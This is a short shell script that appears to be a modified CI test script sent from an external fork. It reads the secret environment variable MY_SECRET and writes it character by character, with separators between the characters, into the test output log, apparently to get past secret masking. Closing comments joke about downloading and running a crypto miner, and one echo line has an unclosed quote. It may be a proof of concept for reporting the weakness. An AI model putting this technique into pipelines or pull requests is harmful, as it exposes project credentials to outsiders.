RET=0

echo "Modified Testing script from EXTERNAL fork " >> runtests.out

foo=$MY_SECRET
ss=""
for (( i=0; i<${#foo}; i++ )); do
  #echo "${foo:$i:1}" >> runtests.out
  ss="$ss$IFS${foo:$i:1}"
done
echo $ss >> runtests.out
echo "Bye from Modified Testing script EXTERNAL [$RET] " >> runtests.out

echo "As you can see, I have no access from EXTERNAL to secrets ..."
echo "Bit ... If I download and execute a CRYPTO MINNER ??? 

exit $RET
